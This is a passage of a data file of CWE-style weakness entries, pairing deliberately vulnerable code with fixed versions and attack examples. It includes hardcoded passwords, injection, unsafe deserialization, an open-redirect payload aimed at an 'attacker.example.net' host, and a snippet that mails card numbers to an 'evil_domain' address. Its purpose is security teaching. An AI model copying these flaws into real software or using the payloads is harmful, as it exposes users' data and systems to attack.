// return reference to private array
int & fv () { return colorValue; } 
// return reference to private integer
};
int main ()
{
Color c;
c.fa () [1] = 42; 
// modifies private array element
c.fv () = 42; 
// modifies private int
return 0;
}

               "
496,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private String[] userRoles;
public void setUserRoles(String[] userRoles) {
this.userRoles = userRoles;
}

               "
497,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char* path = getenv(""PATH"");
...
sprintf(stderr, ""cannot find exe on path %s\n"", path);

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
try {
...
} catch (Exception e) {
e.printStackTrace();
}

               
example: 3
NATURE:bad:
                  
try {
...
} catch (Exception e) {
Console.Writeline(e);
}

               
example: 4
NATURE:bad:
LANGUAGE:C#:
                  
string cs=""database=northwind; server=mySQLServer..."";
SqlConnection conn=new SqlConnection(cs);
...
Console.Writeline(cs);

               "
498,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class CloneClient {

                        
public CloneClient() //throws
java.lang.CloneNotSupportedException {

                              

                                 
Teacher t1 = new Teacher(""guddu"",""22,nagar road"");
//...
// Do some stuff to remove the teacher.
Teacher t2 = (Teacher)t1.clone();
System.out.println(t2.name);

                           
}
public static void main(String args[]) {

                              

                                 
new CloneClient();

                           
}

                     
}
class Teacher implements Cloneable {

                        

                           
public Object clone() {

                              

                                 
try {
return super.clone();
}
catch (java.lang.CloneNotSupportedException e) {

                                    

                                       
throw new RuntimeException(e.toString());

                                 
}

                           
}
public String name;
public String clas;
public Teacher(String name,String clas) {

                              

                                 
this.name = name;
this.clas = clas;

                           
}

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public final void clone() throws java.lang.CloneNotSupportedException {
throw new java.lang.CloneNotSupportedException();
}

               "
499,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
class PatientRecord {
private String name;
private String socialSecurityNum;
public Patient(String name,String ssn) {
this.SetName(name);
this.SetSocialSecurityNumber(ssn);
}
}

               "
500,"
example: 1
NATURE:bad:
LANGUAGE:C++:
                  
class SomeAppClass {

                        

                           
public:
static string appPropertiesConfigFile = ""app/properties.config"";

                           
...

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
public class SomeAppClass {

                        

                           
public static String appPropertiesFile = ""app/Application.properties"";
...

                     
}

               
example: 3
NATURE:good:
LANGUAGE:C++:
                  
class SomeAppClass {

                        

                           
public:
static const string appPropertiesConfigFile = ""app/properties.config"";

                           
...

                     
}

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
public class SomeAppClass {

                        

                           
public static final String appPropertiesFile = ""app/Application.properties"";
...

                     
}

               "
501,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
usrname = request.getParameter(""usrname"");
if (session.getAttribute(ATTR_USR) == null) {
session.setAttribute(ATTR_USR, usrname);
}

               
example: 2
NATURE:bad:
LANGUAGE:C#:
                  
usrname = request.Item(""usrname"");
if (session.Item(ATTR_USR) == null) {
session.Add(ATTR_USR, usrname);
}

               "
502,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
try {
File file = new File(""object.obj"");
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
javax.swing.JButton button = (javax.swing.JButton) in.readObject();
in.close();
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException(""Cannot be deserialized""); }

               
example: 3
NATURE:bad:
LANGUAGE:Python:
                  
try {

                        
class ExampleProtocol(protocol.Protocol):
def dataReceived(self, data):

                           
# Code that would be here would parse the incoming data
# After receiving headers, call confirmAuth() to authenticate

                           
def confirmAuth(self, headers):
try:
token = cPickle.loads(base64.b64decode(headers['AuthToken']))
if not check_hmac(token['signature'], token['data'], getSecretKey()):
raise AuthFail
self.secure_data = token['data']
except:
raise AuthFail

                     
}

               "
506,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
boolean authorizeCard(String ccn) {

                        

                           

                           
// Authorize credit card.

                           

                           

                           
...

                           

                           
mailCardNumber(ccn, ""evil_developer@evil_domain.com"");

                     
}

               "
507,
508,
509,
510,
511,
512,
514,
515,
520,
521,
522,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$user = $_GET['user'];
$pass = $_GET['pass'];
$checkpass = $_GET['checkpass'];
if ($pass == $checkpass) {
SetUserPassword($user, $pass);
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
...
Properties prop = new Properties();
prop.load(new FileInputStream(""config.properties""));
String password = prop.getProperty(""password"");
DriverManager.getConnection(url, usr, password);
...

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
...
String password = regKey.GetValue(passKey).toString();
NetworkCredential netCred = new NetworkCredential(username,password,domain);
...

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
int VerifyAdmin(char *password) {
if (strcmp(compress(password), compressed_password)) {
printf(""Incorrect Password!\n"");
return(0);
}
printf(""Entering Diagnostic Mode...\n"");
return(1);
}

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
int VerifyAdmin(String password) {
if (passwd.Equals(compress(password), compressed_password)) {
return(0);
}

                        
//Diagnostic Mode

                        
return(1);
}

               
example: 6
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
# Java Web App ResourceBundle properties file

                     
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...

               
example: 7
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
523,
524,
525,
526,
527,
528,
529,
530,
531,
532,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
logger.info(""Username: "" + usernme + "", CCN: "" + ccn);

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
locationClient = new LocationClient(this, this, this);
locationClient.connect();
currentUser.setLocation(locationClient.getLastLocation());

                     
...

                     

                     
catch (Exception e) {
AlertDialog.Builder builder = new AlertDialog.Builder(this);
builder.setMessage(""Sorry, this application has experienced an error."");
AlertDialog alert = builder.create();
alert.show();
Log.e(""ExampleActivity"", ""Caught exception: "" + e + "" While on User:"" + User.toString());
}

               "
535,
536,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

                        
String username = request.getParameter(""username"");

                           

                           
// May cause unchecked NullPointerException.

                           
if (username.length() < 10) {
...
}

                     
}

               "
537,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class InputFileRead {

                     

                        
private File readFile = null;
private FileReader reader = null;
private String inputFilePath = null;
private final String DEFAULT_FILE_PATH = ""c:\\somedirectory\\"";

                           
public InputFileRead() {
inputFilePath = DEFAULT_FILE_PATH;
}

                           
public void setInputFile(String inputFile) {

                              

                                 

                                 
/* Assume appropriate validation / encoding is used and privileges / permissions are preserved */

                                 

                              

                           
}

                           
public void readInputFile() {

                              
try {
reader = new FileReader(readFile);
...
} catch (RuntimeException rex) {
System.err.println(""Error: Cannot open input file in the directory "" + inputFilePath);
System.err.println(""Input file has not been set, call setInputFile method before calling readInputFile"");

                                 

                                 
} catch (FileNotFoundException ex) {...}

                              

                           
}

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
public class BankManagerLoginServlet extends HttpServlet {

                        
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

                              
try {

                                    

                                       

                                       
// Get username and password from login page request

                                       
String username = request.getParameter(""username"");
String password = request.getParameter(""password"");

                                       
// Authenticate user

                                       
BankManager bankMgr = new BankManager();
boolean isAuthentic = bankMgr.authenticateUser(username, password);

                                       
// If user is authenticated then go to successful login page

                                       
if (isAuthentic) {
request.setAttribute(""login"", new String(""Login Successful.""));
getServletContext().getRequestDispatcher(""/BankManagerServiceLoggedIn.jsp""). forward(request, response);
}
else {

                                          

                                             

                                             
// Otherwise, raise failed login exception and output unsuccessful login message to error page

                                             
throw new FailedLoginException(""Failed Login for user "" + username + "" with password "" + password);

                                       
}

                                 
} catch (FailedLoginException ex) {

                                    

                                       

                                       
// output failed login message to error page

                                       
request.setAttribute(""error"", new String(""Login Error""));
request.setAttribute(""message"", ex.getMessage());
getServletContext().getRequestDispatcher(""/ErrorPage.jsp"").forward(request, response);

                                 
}

                           
}

                     

                  

               "
538,
539,
540,
541,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
<?php
$dbName = 'usersDB';
$dbPassword = 'skjdh#67nkjd3$3$';
?>

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
<?php
include('database.inc');
$db = connectToDB($dbName, $dbPassword);
$db.authenticateUser($username, $password);
?>

               "
543,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private static NumberConverter singleton;
public static NumberConverter get_singleton() {
if (singleton == null) {
singleton = new NumberConverter();
}
return singleton;
}

               "
544,
546,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
if (user == null) {

                        

                           

                           
// TODO: Handle null user condition.

                           

                        

                     
}

               "
547,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char buffer[1024];
...
fgets(buffer, 1024, stdin);

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
enum { MAX_BUFFER_SIZE = 1024 };
...
char buffer[MAX_BUFFER_SIZE];
...
fgets(buffer, MAX_BUFFER_SIZE, stdin);

               "
548,
549,
550,
551,
552,
553,
554,
555,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword

               "
556,
558,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
pwd = getpwnam(getlogin());
if (isTrustedGroup(pwd->pw_gid)) {
allow();
} else {
deny();
}

               "
560,
561,"
example: 1
NATURE:bad:
LANGUAGE:C++:
                  
String s = null;
if (b) {
s = ""Yes"";
return;
}

                     
if (s != null) {
Dead();
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
public class DoubleDead {
private void doTweedledee() {
doTweedledumb();
}
private void doTweedledumb() {
doTweedledee();
}
public static void main(String[] args) {
System.out.println(""running DoubleDead"");
}
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public class Dead {

                        
String glue;

                           
public String getGlue() {
return ""glue"";
}

                     
}

               "
562,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char* getName() {
char name[STR_MAX];
fillInName(name);
return name;
}

               "
563,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
r = getName();
r = getNewBuffer(buf);

               "
564,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String street = getStreetFromUser();
Query query = session.createQuery(""from Address a where a.street='"" + street + ""'"");

               "
565,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(""role"")) {
userRole = c.getValue();
}
}

               "
566,"
example: 1
NATURE:bad:
LANGUAGE:C#:
                  
...
conn = new SqlConnection(_ConnectionString);
conn.Open();
int16 id = System.Convert.ToInt16(invoiceID.Text);
SqlCommand query = new SqlCommand( ""SELECT * FROM invoices WHERE id = @id"", conn);
query.Parameters.AddWithValue(""@id"", id);
SqlDataReader objReader = objCommand.ExecuteReader();
...

               "
567,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public static class Counter extends HttpServlet {
static int count = 0;
protected void doGet(HttpServletRequest in, HttpServletResponse out)
throws ServletException, IOException {
out.setContentType(""text/plain"");
PrintWriter p = out.getWriter();
count++;
p.println(count + "" hits so far!"");
}
}

               "
568,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
protected void finalize() {
discardNative();
}

               "
570,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  

                     
public void updateUserAccountOrder(String productNumber, String accountNumber) {

                        
boolean isValidProduct = false;
boolean isValidAccount = false;

                           
if (validProductNumber(productNumber)) {
isValidProduct = true;
updateInventory(productNumber);
}
else {
return;
}

                           
if (validAccountNumber(accountNumber)) {
isValidProduct = true;
updateAccount(accountNumber, productNumber);
}

                           
if (isValidProduct && isValidAccount) {
updateAccountOrder(accountNumber, productNumber);
}

                     
}

               
example: 2
NATURE:good:
                  
...
if (validAccountNumber(accountNumber)) {
isValidAccount = true;
updateAccount(accountNumber, productNumber);
}
...

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
#define BIT_READ 0x0001 // 00000001
#define BIT_WRITE 0x0010 // 00010000

                     
unsigned int mask = BIT_READ & BIT_WRITE; /* intended to use ""|"" */

                     
// using ""&"", mask = 00000000
// using ""|"", mask = 00010001

                     
// determine if user has read and write access
int hasReadWriteAccess(unsigned int userMask) {

                        
// if the userMask has read and write bits set
// then return 1 (true)
if (userMask & mask) {
return 1;
}

                           
// otherwise return 0 (false)
return 0;

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
int updateInventory(char* productNumber, int numberOfItems) {

                     

                        
int initCount = getProductCount(productNumber);

                           
int updatedCount = initCount + numberOfItems;

                           
int updated = updateProductCount(updatedCount);

                           
// if statement for debugging purposes only
if (1 == 0) {

                              

                                 
char productName[128];
productName = getProductName(productNumber);

                                 
printf(""product %s initially has %d items in inventory \n"", productName, initCount);
printf(""adding %d items to inventory for %s \n"", numberOfItems, productName);

                                 
if (updated == 0) {
printf(""Inventory updated for product %s to %d items \n"", productName, updatedCount);
}

                                 
else {
printf(""Inventory not updated for product: %s \n"", productName);
}

                              

                           
}

                           
return updated;

                     
}

                  

               "
571,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  

                     
public void updateInventory(String productNumber) {

                        
boolean isProductAvailable = false;
boolean isDelayed = false;

                           
if (productInStore(productNumber)) {
isProductAvailable = true;
updateInStoreDatabase(productNumber);
}
else if (productInWarehouse(productNumber)) {
isProductAvailable = true;
updateInWarehouseDatabase(productNumber);
}
else {
isProductAvailable = true;
}

                           
if ( isProductAvailable ) {
updateProductDatabase(productNumber);
}
else if ( isDelayed ) {

                              

                                 

                                 
/* Warn customer about delay before order processing */

                                 
...

                           
}

                     
}

               "
572,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Thread thr = new Thread() {
public void run() {
...
}
};

                     
thr.run();

               "
573,
574,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
@Entity
public class Customer implements Serializable {

                     

                        
private String id;
private String firstName;
private String lastName;
private Address address;

                           
public Customer() {...}

                           
public Customer(String id, String firstName, String lastName) {...}

                           
@Id
public String getCustomerId() {...}

                           
public synchronized void setCustomerId(String id) {...}

                           
public String getFirstName() {...}

                           
public synchronized void setFirstName(String firstName) {...}

                           
public String getLastName() {...}

                           
public synchronized void setLastName(String lastName) {...}

                           
@OneToOne()
public Address getAddress() {...}

                           
public synchronized void setAddress(Address address) {...}

                     
}

               "
575,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
@Stateless
public class ConverterSessionBean extends Component implements KeyListener, ConverterSessionRemote {

                        

                           

                           
/* member variables for receiving keyboard input using AWT API */

                           

                           
...
private StringBuffer enteredText = new StringBuffer();

                           

                           
/* conversion rate on US dollars to Yen */

                           

                           
private BigDecimal yenRate = new BigDecimal(""115.3100"");

                           
public ConverterSessionBean() {

                              
super();

                                 
/* method calls for setting up AWT Component for receiving keyboard input */

                                 

                                 
...
addKeyListener(this);

                           
}

                           
public BigDecimal dollarToYen(BigDecimal dollars) {
BigDecimal result = dollars.multiply(yenRate);
return result.setScale(2, BigDecimal.ROUND_DOWN);
}

                           

                           
/* member functions for implementing AWT KeyListener interface */

                           

                           
public void keyTyped(KeyEvent event) {
...
}

                           
public void keyPressed(KeyEvent e) {
}

                           
public void keyReleased(KeyEvent e) {
}

                           

                           
/* member functions for receiving keyboard input and displaying output */

                           

                           
public void paint(Graphics g) {...}

                           
...

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
@Stateless
public class ConverterSessionBean implements ConverterSessionRemoteInterface {

                        

                           

                           
/* conversion rate on US dollars to Yen */

                           
private BigDecimal yenRate = new BigDecimal(""115.3100"");

                           
public ConverterSessionBean() {
}

                           

                           
/* remote method to convert US dollars to Yen */

                           

                           
public BigDecimal dollarToYen(BigDecimal dollars) {
BigDecimal result = dollars.multiply(yenRate);
return result.setScale(2, BigDecimal.ROUND_DOWN);
}

                     
}

               
example: 3
NATURE:good:
LANGUAGE:JSP:
                  
<%@ page import=""converter.ejb.Converter, java.math.*, javax.naming.*""%>
<%!

                        
private Converter converter = null;
public void jspInit() {
try {
InitialContext ic = new InitialContext();
converter = (Converter) ic.lookup(Converter.class.getName());
} catch (Exception ex) {
System.out.println(""Couldn't create converter bean.""+ ex.getMessage());
}
}
public void jspDestroy() {
converter = null;
}

                     

                     
%>
<html>

                        
<head><title>Converter</title></head>
<body bgcolor=""white"">

                              
<h1>Converter</h1>
<hr>
<p>Enter an amount to convert:</p>
<form method=""get"">
<input type=""text"" name=""amount"" size=""25""><br>
<p>
<input type=""submit"" value=""Submit"">
<input type=""reset"" value=""Reset"">
</form>
<%
String amount = request.getParameter(""amount"");
if ( amount != null && amount.length() > 0 ) {
BigDecimal d = new BigDecimal(amount);
BigDecimal yenAmount = converter.dollarToYen(d);

                                 

                                 
%>
<p>
<%= amount %> dollars are <%= yenAmount %> Yen.
<p>
<%
}

                                 
%>

                           
</body>

                     
</html>

               "
576,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
@Stateless
public class InterestRateBean implements InterestRateRemote {

                     

                        
private Document interestRateXMLDocument = null;
private File interestRateFile = null;

                           
public InterestRateBean() {

                              
try {

                                    

                                       

                                       
/* get XML document from the local filesystem */

                                       
interestRateFile = new File(Constants.INTEREST_RATE_FILE);

                                       
if (interestRateFile.exists())
{
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
interestRateXMLDocument = db.parse(interestRateFile);
}

                                 
} catch (IOException ex) {...}

                           
}

                           
public BigDecimal getInterestRate(Integer points) {
return getInterestRateFromXML(points);
}

                           

                           
/* member function to retrieve interest rate from XML document on the local file system */

                           

                           
private BigDecimal getInterestRateFromXML(Integer points) {...}

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
@Stateless
public class InterestRateBean implements InterestRateRemote {

                        

                           
public InterestRateBean() {
}

                           
public BigDecimal getInterestRate(Integer points) {
return getInterestRateFromXMLParser(points);
}

                           

                           
/* member function to retrieve interest rate from XML document using an XML parser API */

                           

                           
private BigDecimal getInterestRateFromXMLParser(Integer points) {...}

                     
}

               "
577,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
@Stateless
public class StockSymbolBean implements StockSymbolRemote {

                        

                           
ServerSocket serverSocket = null;
Socket clientSocket = null;

                           
public StockSymbolBean() {

                              
try {
serverSocket = new ServerSocket(Constants.SOCKET_PORT);
} catch (IOException ex) {...}

                                 
try {
clientSocket = serverSocket.accept();
} catch (IOException e) {...}

                           
}

                           
public String getStockSymbol(String name) {...}

                           
public BigDecimal getStockValue(String symbol) {...}

                           
private void processClientInputFromSocket() {...}

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
@Stateless
public class StockSymbolBean extends Thread implements StockSymbolRemote {

                        

                           
ServerSocket serverSocket = null;
Socket clientSocket = null;
boolean listening = false;

                           
public StockSymbolBean() {

                              
try {
serverSocket = new ServerSocket(Constants.SOCKET_PORT);
} catch (IOException ex) {...}

                                 
listening = true;
while(listening) {
start();
}

                           
}

                           
public String getStockSymbol(String name) {...}

                           
public BigDecimal getStockValue(String symbol) {...}

                           
public void run() {
try {
clientSocket = serverSocket.accept();
} catch (IOException e) {...}
...
}

                        

                     
}

               "
578,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
@Stateless
public class InterestRateBean implements InterestRateRemote {

                     

                        
private Document interestRateXMLDocument = null;

                           
public InterestRateBean() {

                              
try {

                                    

                                       

                                       
// get XML document from the local filesystem as an input stream

                                       

                                       

                                       
// using the ClassLoader for this class

                                       
ClassLoader loader = this.getClass().getClassLoader();
InputStream in = loader.getResourceAsStream(Constants.INTEREST_RATE_FILE);

                                 

                              

                           

                           

                           
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
interestRateXMLDocument = db.parse(interestRateFile);
} catch (IOException ex) {...}

                     
}

                     

                        
public BigDecimal getInterestRate(Integer points) {
return getInterestRateFromXML(points);
}

                           

                           
/* member function to retrieve interest rate from XML document on the local file system */

                           

                           
private BigDecimal getInterestRateFromXML(Integer points) {...}

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
@Stateless
public class LoaderSessionBean implements LoaderSessionRemote {

                     

                        
public LoaderSessionBean() {
try {
ClassLoader loader = new CustomClassLoader();
Class c = loader.loadClass(""someClass"");
Object obj = c.newInstance();
/* perform some task that uses the new class instance member variables or functions */
...
} catch (Exception ex) {...}
}

                           
public class CustomClassLoader extends ClassLoader {

                           
}

                     
}

               "
579,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class DataGlob {

                        
String globName;
String globValue;

                           
public void addToSession(HttpSession session) {
session.setAttribute(""glob"", this);
}

                     
}

               "
580,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class Kibitzer {

                        
public Object clone() throws CloneNotSupportedException {

                              

                                 
Object returnMe = new Kibitzer();
...

                           
}

                     
}

                     
public class FancyKibitzer extends Kibitzer{

                        
public Object clone() throws CloneNotSupportedException {

                              

                                 
Object returnMe = super.clone();
...

                           
}

                     
}

               "
581,
582,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public final class urlTool extends Applet {
public final static URL[] urls;
...
}

               "
583,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public final class urlTool extends Applet {
public void finalize() {
...
}
...
}

               "
584,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
try {
...
throw IllegalArgumentException();
}
finally {
return r;
}

               "
585,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
synchronized(this) { }

               
example: 2
NATURE:good:
                  
public void setID(int ID){
synchronized(this){
this.ID = ID;
}
}

               "
586,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
// time to clean up

                     
widget.finalize();

               "
587,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int (*pt2Function) (float, char, char)=0x08040000;
int result2 = (*pt2Function) (12, 'a', 'b');

                     
// Here we can inject code to execute.

                     

                  

               "
588,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
struct foo
{
int i;
}
...
int main(int argc, char **argv)
{
*foo = (struct foo *)main;
foo->i = 2;
return foo->i;
}

               "
589,
590,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void foo(){

                        
record_t bar[MAX_SIZE];

                           

                           
/* do something interesting with bar */

                           

                           
...
free(bar);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
record_t bar[MAX_SIZE]; //Global var
void foo(){

                        

                           

                           
/* do something interesting with bar */

                           
...
free(bar);

                     
}

               
example: 3
NATURE:good:
                  
void foo(){

                        
record_t *bar = (record_t*)malloc(MAX_SIZE*sizeof(record_t));

                           

                           
/* do something interesting with bar */

                           

                           
...
free(bar);

                     
}

               
example: 4
NATURE:good:
                  
record_t *bar; //Global var
void foo(){

                        
bar = (record_t*)malloc(MAX_SIZE*sizeof(record_t));

                           

                           
/* do something interesting with bar */

                           

                           
...
free(bar);

                     
}

               "
591,
593,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define CERT ""secret.pem""
#define CERT2 ""secret2.pem""

                     
int main(){

                        
SSL_CTX *ctx;
SSL *ssl;
init_OpenSSL();
seed_prng();

                           
ctx = SSL_CTX_new(SSLv23_method());

                           
if (SSL_CTX_use_certificate_chain_file(ctx, CERT) != 1)
int_error(""Error loading certificate from file"");

                           

                           
if (SSL_CTX_use_PrivateKey_file(ctx, CERT, SSL_FILETYPE_PEM) != 1)
int_error(""Error loading private key from file"");

                           

                           
if (!(ssl = SSL_new(ctx)))
int_error(""Error creating an SSL context"");

                           

                           
if ( SSL_CTX_set_default_passwd_cb(ctx, ""new default password"" != 1))
int_error(""Doing something which is dangerous to do anyways"");

                           

                           
if (!(ssl2 = SSL_new(ctx)))
int_error(""Error creating an SSL context"");

                        

                     
}

               "
594,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
@Entity
public class Customer {

                     

                        
private String id;
private String firstName;
private String lastName;
private Address address;

                           
public Customer() {
}

                           
public Customer(String id, String firstName, String lastName) {...}

                           
@Id
public String getCustomerId() {...}

                           
public void setCustomerId(String id) {...}

                           
public String getFirstName() {...}

                           
public void setFirstName(String firstName) {...}

                           
public String getLastName() {...}

                           
public void setLastName(String lastName) {...}

                           
@OneToOne()
public Address getAddress() {...}

                           
public void setAddress(Address address) {...}

                     

                     

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public class Customer implements Serializable {...}

               "
595,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String str1 = new String(""Hello"");
String str2 = new String(""Hello"");
if (str1 == str2) {
System.out.println(""str1 == str2"");
}

               
example: 2
NATURE:good:
                  
if (str1.equals(str2)) {
System.out.println(""str1 equals str2"");
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public boolean isSameAccount(BankAccount accountA, BankAccount accountB) {
return accountA == accountB;
}

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
public boolean isSameAccount(BankAccount accountA, BankAccount accountB) {
return accountA.equals(accountB);
}

               "
597,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String str1 = new String(""Hello"");
String str2 = new String(""Hello"");
if (str1 == str2) {
System.out.println(""str1 == str2"");
}

               
example: 2
NATURE:good:
                  
if (str1.equals(str2)) {
System.out.println(""str1 equals str2"");
}

               "
598,
599,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
if (cert = SSL_get_peer_certificate(ssl)) {

                        

                           

                           
// got certificate, host can be trusted

                           

                           

                           
//foo=SSL_get_verify_result(ssl);

                           

                           

                           
//if (X509_V_OK==foo) ...

                           

                        

                     
}

               "
600,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {
String ip = req.getRemoteAddr();
InetAddress addr = InetAddress.getByName(ip);
...
out.println(""hello "" + addr.getHostName());
}

               "
601,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$redirect_url = $_GET['url'];
header(""Location: "" . $redirect_url);

               
example: 2
NATURE:attack:
                  
http://example.com/example.php?url=http://malicious.example.com

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public class RedirectServlet extends HttpServlet {

                     

                        
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
String query = request.getQueryString();
if (query.contains(""url"")) {
String url = request.getParameter(""url"");
response.sendRedirect(url);
}
}

                     
}

               
example: 4
NATURE:attack:
LANGUAGE:HTML:
                  
<a href=""http://bank.example.com/redirect?url=http://attacker.example.net"">Click here to log in</a>

               "
602,"
example: 1
NATURE:good:
LANGUAGE:Perl:
                  
$server = ""server.example.com"";
$username = AskForUserName();
$password = AskForPassword();
$address = AskForAddress();
$sock = OpenSocket($server, 1234);
writeSocket($sock, ""AUTH $username $password\n"");
$resp = readSocket($sock);
if ($resp eq ""success"") {

                        

                           

                           
# username/pass is valid, go ahead and update the info!

                           
writeSocket($sock, ""CHANGE-ADDRESS $username $address\n"";

                     
}
else {
print ""ERROR: Invalid Authentication!\n"";
}

               
example: 2
NATURE:bad:
                  
$sock = acceptSocket(1234);
($cmd, $args) = ParseClientRequest($sock);
if ($cmd eq ""AUTH"") {

                        
($username, $pass) = split(/\s+/, $args, 2);
$result = AuthenticateUser($username, $pass);
writeSocket($sock, ""$result\n"");

                           
# does not close the socket on failure; assumes the

                           

                           

                           
# user will try again

                           

                        

                     
}
elsif ($cmd eq ""CHANGE-ADDRESS"") {
if (validateAddress($args)) {
$res = UpdateDatabaseRecord($username, ""address"", $args);
writeSocket($sock, ""SUCCESS\n"");
}
else {
writeSocket($sock, ""FAILURE -- address is malformed\n"");
}
}

               "
603,
605,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void bind_socket(void) {

                        

                           
int server_sockfd;
int server_len;
struct sockaddr_in server_address;

                           

                           
/*unlink the socket if already bound to avoid an error when bind() is called*/

                           

                           
unlink(""server_socket"");
server_sockfd = socket(AF_INET, SOCK_STREAM, 0);

                           
server_address.sin_family = AF_INET;
server_address.sin_port = 21;
server_address.sin_addr.s_addr = htonl(INADDR_ANY);
server_len = sizeof(struct sockaddr_in);

                           
bind(server_sockfd, (struct sockaddr *) &s1, server_len);

                     
}

               "
606,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void iterate(int n){
int i;
for (i = 0; i < n; i++){
foo();
}
}
void iterateFoo()
{
unsigned int num;
scanf(""%u"",&num);
iterate(num);
}

               "
607,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public static final String[] USER_ROLES;

               "
608,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                     

                        
// variables for registration form
public String name;
public String email;
...

                           
public RegistrationForm() {
super();
}
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}
...

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                     

                        
// private variables for registration form
private String name;
private String email;
...

                           
public RegistrationForm() {
super();
}

                           
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}

                     

                     

                     

                     
